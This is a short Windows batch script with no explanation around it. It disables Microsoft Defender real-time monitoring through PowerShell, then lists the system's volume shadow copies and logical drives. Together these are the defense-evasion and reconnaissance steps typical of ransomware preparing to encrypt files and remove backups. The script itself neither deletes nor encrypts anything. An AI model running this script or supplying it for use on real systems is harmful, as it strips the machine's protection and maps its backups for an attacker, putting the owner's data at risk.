@echo off
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -Force"
vssadmin list shadows
wmic logicaldisk get name
